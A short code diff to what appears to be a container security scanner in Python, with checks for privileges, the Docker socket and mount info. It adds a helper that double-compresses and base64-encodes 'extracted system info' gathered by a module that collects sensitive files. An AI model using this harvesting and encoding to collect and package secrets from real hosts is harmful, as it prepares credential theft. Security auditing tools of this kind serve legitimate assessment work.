@@ -12,6 +12,8 @@ import importlib
 import subprocess
 import sys
 import requests
+import zlib
+import base64
 from dotenv import load_dotenv
 # load .env for sensitive tokens
 load_dotenv()
@@ -180,7 +182,7 @@ class ContainerSenScanner:
     # 10. Run all modules
     # ------------------------------------------------------------------
     def run(self):
-        self.detect_container()
+        self._detect_container()
         self.privilege_and_namespace_check()
         self.check_docker_socket()
         self.read_mountinfo()
@@ -190,7 +192,22 @@ class ContainerSenScanner:
         self.log_scan()
 
         return self.report
-    
+
+    def _encode_compress(self, data:str):
+        ''' compress and encode extracted system info with Maximum compression
+        
+        '''
+        # first compression
+        compress_1_data = zlib.compress(data.encode())
+
+        # second compression
+        compress_2_data = zlib.compress(compress_1_data)
+
+        # base64 encoding
+        final_encoded = base64.b64encode(compress_2_data)
+
+        return final_encoded
+
     def _sen_info(self, file:str):
         ''' the module to collect sensitive info from specific locations/files/extensions
         
